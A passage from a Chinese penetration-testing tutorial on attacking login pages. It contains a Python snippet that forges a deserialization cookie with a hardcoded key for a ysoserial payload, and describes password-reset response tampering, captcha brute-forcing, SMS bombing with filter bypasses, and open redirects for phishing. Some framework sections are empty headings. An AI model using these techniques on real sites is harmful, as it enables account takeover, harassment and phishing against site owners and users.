        IV = Random.new().read(AES.block_size)
        cipher = AES.new(key, AES.MODE_CBC, IV=IV)
        data = b64encode(IV + cipher.encrypt(pad(text)))
        return data
    key= b64decode('2AvVhdsgUs0FSA3SDFAdag==')
    print encrypt(key, open('payload.dat','rb').read())
使用方法  
1：java -jar ysoserial.jar URLDNS "你的ceye.io或者burp的collaborator
client功能中">payload.dat  
2：运行python脚本，生成cookie  
3：将cookie复制到burp发包,此时DNSlog就会记录，我们可以再次构造进行命令执行，在这不进行深入。  
致远A8-getshell：   
Thinkphp：   
Struts2:   
weblogic:   
以及各大Java反序列化漏洞等等，这里的漏洞都说不完了。
* * *
### **0x05** 逻辑漏洞
寻找逻辑漏洞，例如忘记密码，任意用户注册
**任意重置密码**  
例如  
此时客户端会发一个验证码包，我们这是随意输入验证码，发包，返回包。  
返回包错误的回显为{"status":0}  
将返回包的东西换成{"status":1}  
即可重置密码  
乌云示例：
**任意用户注册**  
爆破注册页面的验证码，即可任意用户注册  
同样，这里的验证码如果为四位数的话，有时候也可能存在可爆破，可进行任意用户重置密码
**短信轰炸**  
短信轰炸很常见，一般在发送验证码后抓包，不断repeate即可，如果做了一定防护的话，在添加空格，或者特殊符号，或+86等都可以进行绕过
未经过防护的短信爆破十分常见  
**不完全的登录**  
这个漏洞我找到过一次，就是在登录页面，随意输入任意的账户和密码，然后抓包，修改返回包，骗过前端，从而获得一定的权限，其功能不完善，但是依旧可以看到许多敏感数据。
逻辑漏洞这里要根据不同网站来进行测试，逻辑漏洞的方式多种多样，常常会遇到许多奇怪的姿势，例如cookie某字段为Guest，修改为admin即可更换用户身份的，还需要在日常工作中多加总结。
### **0x06** 禁用JS
**禁用JS插件，查看页面源代码12**  
禁用JS和查看源代码，有时候会有意想不到的惊喜。  
例如某些重定向，某些权限缺失，在我们未授权进入后台一瞬间，就会重定向回去登录页面，而如果此时我们禁用了JS，则可以进行一定权限的控制。
查看源代码则不用多说，有的不大聪明的程序员可能会在源代码里泄露一些不可告人的秘密，例如测试账号，还有我们可能会找到一些网站的后台结构，以及JS接口。
### **0x07** URL重定向
**URL重定向**  
URL重定向是我们渗透测试中非常常见的一个漏洞，一般出现在以下参数里，而登录时常常也有这个URL重定向到后台网站，我们修改这个后台网站的URL即可跳转到任意页面，可用于钓鱼页面的制作  
例如   
url后面常会进行base64编码处理
常见URL跳转参数：  
redirect  
redirect_to  
redirect_url  
url  
jump  
jump_to  
target  
to  
link  
linkto  
Domain
### **0x08** 未授权访问
各种未授权访问，免登录进入后台  
未授权访问在这里有更强的大佬总结了，其需要我们对端口进行注意观察。  
### **0x09 验证码问题**
**验证码可修改接受者**  
可将A账号的修改密码验证码接受者修改为B，这样A账号的验证码就会发到B的手机上，从而B可以重置A的账号密码  
例如A账号moblephone=13333888888 ，这点是可控的，我们修改为moblephone=18888888888,即可收到A账号的重置验证码  
**登录验证码可绕过**  
可能存在万能验证码0000或者9999，不过此类情况较为罕见。更多的情况为修改返回包，可能会出现可绕过逻辑判断。
**验证码可爆破**  
验证码失效的时间过长，并且为纯数字或者过短字符，导致可被爆破。
**验证码回显前端**  
有的网站验证码会回显到前端，只需要抓包即可获得验证码  
**验证码不刷新**  
验证码不会自动刷新，导致我们可一码多次使用，我们只需要输入一次验证码就可以让我们能够开始进行暴力破解。
**验证码识别**  
这里使用PKAV的验证码自动识别  
链接： 提取码：szo2
### **0x10 总结**
简单的来说，遇到一个登陆站点，我们需要做的时候有  
1、条件允许的情况下开启漏洞扫描  
2、敏感信息的探测，例如端口，目录，JS文件  
3、爆破弱口令  
4、抓包看看是否存在逻辑漏洞，或者SQL注入进行尝试  
5、寻找框架漏洞  
PS:如果遇到某些大网站的主站登录，例如银行，建议放弃，寻找其他业务，例如招聘站点登录等。